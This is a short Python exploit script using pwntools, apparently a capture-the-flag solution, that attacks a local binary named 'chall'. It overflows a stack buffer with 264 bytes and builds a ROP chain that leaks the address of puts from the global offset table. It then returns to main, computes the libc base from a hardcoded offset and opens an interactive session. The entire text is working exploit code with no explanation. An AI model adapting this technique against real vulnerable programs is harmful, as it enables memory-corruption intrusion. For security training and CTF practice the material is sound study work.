from pwn import *

exe = context.binary = ELF("./chall")
context.log_level = 'debug'
r = process()
offset = 264
rop = ROP(exe)
rop.raw(b"A" * offset)
rop.raw(0x00000000004011ad)
rop.raw(exe.got['puts'])
rop.raw(exe.plt['puts'])
rop.raw(exe.sym['main'])
r.sendline(rop.chain())
r.recvline()
puts_leak = u64(r.recvline().strip().ljust(8, b'\x00'))
print(f"puts leak: {hex(puts_leak)}")
libc_base = puts_leak - 0x7f680
print(f"libc base: {hex(libc_base)}")
r.interactive()